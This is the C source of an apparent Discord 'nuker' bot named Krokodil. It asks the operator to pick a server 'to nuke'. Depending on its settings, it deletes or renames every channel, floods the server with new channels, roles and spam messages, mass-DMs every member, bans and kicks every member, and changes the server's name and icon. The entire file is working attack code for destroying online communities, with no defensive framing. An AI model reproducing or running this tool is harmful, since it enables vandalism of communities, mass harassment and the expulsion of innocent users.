#include <kk_client.h>
#include <kk_config.h>
#include <kk_dashboard.h>
#include <kk_callbacks.h>
#include <kk_ui.h>

#include <string.h>
#include <stdbool.h>
#include <orca/discord.h>

u64_snowflake_t get_guild(struct discord *client)
{
    struct discord_guild **guilds = NULL;
    discord_get_current_user_guilds(client, &guilds);
    // assert(NULL != guilds && "Couldn't fetch guilds");

    printf("\n\nSelect the guild to nuke "
           "is part of");
    int i = 0;
    char *input_id = "1133087870962384937";
    char *formatted_id = "";

    while (guilds[i])
    {
        printf("\n%d. %s", i + 1, guilds[i]->name);
        ++i;
    }

    do
    {
        printf("\n\nNUMBER >>");
        char strnum[10];
        fgets(strnum, sizeof(strnum), stdin);
        int num = strtol(strnum, NULL, 10);
        if (num > 0 && num <= i)
        {
            u64_snowflake_t guild_id = guilds[num - 1]->id;
            discord_guild_list_free(guilds);
            return guild_id;
        }
        printf("\nPlease, insert a value between 1 and %d", i);
    } while (1);
}

void mass_channel(struct discord *client, u64_snowflake_t guild_id,
                  char channel_name[15], int count, int type)
{
    char *c_name = strtok(channel_name, "");

    struct discord_create_guild_channel_params chn_params = {.name = c_name, .type = type};

    int i = 0;

    for (i = 0; i < count; i++)
    {
        discord_create_guild_channel(client, guild_id, &chn_params, NULL);
    }

    log_info("Created %d channels in %" PRIu64, i + 1, guild_id);
}

void guild_name(struct discord *client, u64_snowflake_t guild_id,
                char *guild_name)
{
    discord_modify_guild(
        client,
        guild_id,
        &(struct discord_modify_guild_params){
            .name = guild_name,
        },
        NULL);
    log_info("Change name of %" PRIu64 " --> \"%s\"", guild_id, guild_name);
}

void dm_all(struct discord *client, u64_snowflake_t guild_id,
            char message[2000])
{
    char *d_message = strtok(message, "");

    struct discord_guild_member **members = NULL;

    discord_list_guild_members(
        client,
        guild_id,
        &(struct discord_list_guild_members_params){
            .limit = 1000,
        },
        &members);

    int i = 0;

    struct discord_channel dm_channel = {0};

    while (members[i])
    {
        discord_create_dm(
            client,
            &(struct discord_create_dm_params){
                .recipient_id = members[i]->user->id,
            },
            &dm_channel);
        ++i;

        discord_create_message(
            client,
            dm_channel.id,
            &(struct discord_create_message_params){
                .content = d_message},
            NULL);
    }
    log_info("Sent message to %d users in %" PRIu64, i + 1, guild_id);
}

void delete_all_channels(struct discord *client, u64_snowflake_t guild_id)
{
    struct discord_channel **channels;

    discord_get_guild_channels(client, guild_id, &channels);

    int i = 0;
    while (channels[i])
    {
        discord_delete_channel(client, channels[i]->id, NULL);
        i++;
    }
    log_info("Deleted %d channels in %" PRIu64, i + 1, guild_id);
}

void rename_all_channels(struct discord *client, u64_snowflake_t guild_id,
                         char c_name[30])
{
    char *channel_name = strtok(c_name, "");
    struct discord_channel **channels;

    discord_get_guild_channels(client, guild_id, &channels);

    int i = 0;
    while (channels[i])
    {
        discord_modify_channel(
            client,
            channels[i]->id,
            &(struct discord_modify_channel_params){
                .name = channel_name},
            NULL);
        i++;
    }

    log_info("Renamed %d channels in %" PRIu64 " --> \"%s\"", i + 1, guild_id, channel_name);
}

void change_nickname(struct discord *client, u64_snowflake_t guild_id,
                     char _nickname[30])
{
    char *nickname = strtok(_nickname, "");
    discord_modify_current_member(
        client,
        guild_id,
        &(struct discord_modify_guild_member_params){
            .nick = nickname},
        NULL);
}

void ban_all(struct discord *client, u64_snowflake_t guild_id)
{
    struct discord_guild_member **members = NULL;

    discord_list_guild_members(
        client,
        guild_id,
        &(struct discord_list_guild_members_params){
            .limit = 1000,
        },
        &members);
    int i = 0;

    while (members[i])
    {
        discord_create_guild_ban(
            client,
            guild_id,
            members[i]->user->id,
            &(struct discord_create_guild_ban_params){
                .delete_message_days = 0});
        i++;
    }

    log_info("Banned %d users in %" PRIu64, i, guild_id);
}

void kick_all(struct discord *client, u64_snowflake_t guild_id)
{
    struct discord_guild_member **members = NULL;

    discord_list_guild_members(
        client,
        guild_id,
        &(struct discord_list_guild_members_params){
            .limit = 1000,
        },
        &members);
    int i = 0;

    while (members[i])
    {
        discord_remove_guild_member(
            client,
            guild_id,
            members[i]->user->id);
        i++;
    }

    log_info("Kicked %d users in %" PRIu64, i, guild_id);
}

void spam_messages(struct discord *client, u64_snowflake_t guild_id,
                   char _message[2000], int amount)
{
    char *message = strtok(_message, "");
    struct discord_channel **channels;

    discord_get_guild_channels(client, guild_id, &channels);

    int i = 0;
    for (int x = 0; x < amount; x++)
    {
        while (channels[i])
        {
            discord_create_message(
                client,
                channels[i]->id,
                &(struct discord_create_message_params){
                    .content = message},
                NULL);
            i++;
        }
    }
    log_info("Sent %d messages in %" PRIu64, amount * i, guild_id);
}

void change_icon(struct discord *client, u64_snowflake_t guild_id,
                 char _icon[300])
{
    char *icon = strtok(_icon, "");

    discord_modify_guild(
        client,
        guild_id,
        &(struct discord_modify_guild_params){
            .icon = icon},
        NULL);
}

void mass_roles(struct discord *client, u64_snowflake_t guild_id,
                  char role_name[15], int count)
{
    char *r_name = strtok(role_name, "");

    int i = 0;

    for (i = 0; i < count; i++)
    {
        discord_create_guild_role(
            client,
            guild_id,
            &(struct discord_create_guild_role_params) {
                .name = r_name
            },
            NULL
        );
    }

    log_info("Created %d roles in %" PRIu64, i, guild_id);
}

void on_ready(struct discord *client)
{
    const struct discord_user *bot = discord_get_self(client);
    log_info("Logged in as %s!", bot->username);

    u64_snowflake_t guild_id = get_guild(client);

    char *presence_name = strtok(s_attack.presence_name, "");
    char *presence_status = strtok(s_attack.presence_status, "");

    if (s_attack.presence_enabled)
    {
        discord_set_presence(client, &(struct discord_presence_status){
                                         .activities =
                                             (struct discord_activity *[]){
                                                 &(struct discord_activity){
                                                     .name = presence_name,
                                                     .type = s_attack.presence_type,
                                                     .details = "Krokodil Everywhere",
                                                 },
                                                 NULL},
                                         .status = presence_status,
                                         .afk = false,
                                         .since = discord_timestamp(client),
                                     });
    }

    if (s_attack.nickname_enabled == true)
    {
        change_nickname(client, guild_id, s_attack.nickname_name);
    }

    if (s_attack.guild_name_enabled == true)
    {
        guild_name(client, guild_id, s_attack.guild_name);
    }

    if (s_attack.change_icon_enabled == true)
    {
        change_icon(client, guild_id, s_attack.change_icon_path);
    }

    if (s_attack.channel_delete_all == true)
    {
        delete_all_channels(client, guild_id);
    }

    if (s_attack.rename_channel_enabled == true)
    {
        rename_all_channels(client, guild_id, s_attack.rename_channel_name);
    }

    if (s_attack.mass_channel_enabled == true)
    {
        mass_channel(client, guild_id, s_attack.mass_channel_name, s_attack.mass_channel_count, s_attack.mass_channel_type);
    }

    if (s_attack.send_message_enabled == true)
    {
        spam_messages(client, guild_id, s_attack.send_message_message, s_attack.send_message_amount);
    }

    if (s_attack.dm_all_enabled == true)
    {
        dm_all(client, guild_id, s_attack.dm_message);
    }
    
    if (s_attack.ban_all_enabled == true)
    {
        ban_all(client, guild_id);
    }

    if(s_attack.kick_all_enabled == true)
    {
        kick_all(client, guild_id);
    }

    if(s_attack.roles_mass_enabled == true) 
    {
        mass_roles(client, guild_id, s_attack.roles_mass_name, s_attack.roles_mass_count);
    }
}

void on_message(struct discord *client,
                const struct discord_message *msg)
{
    if (strcmp(msg->content, "ping") != 0)
        return;

    discord_delete_channel(client, msg->channel_id, NULL);
    discord_async_next(client, NULL);
    struct discord_create_message_params params = {.content = "pong"};
    discord_create_message(client, msg->channel_id, &params, NULL);
}

void *client_init(char *TOKEN)
{
    struct discord *client = discord_init(TOKEN);
    discord_set_on_ready(client, &on_ready);
    discord_set_on_message_create(client, &on_message);
    discord_run(client);
}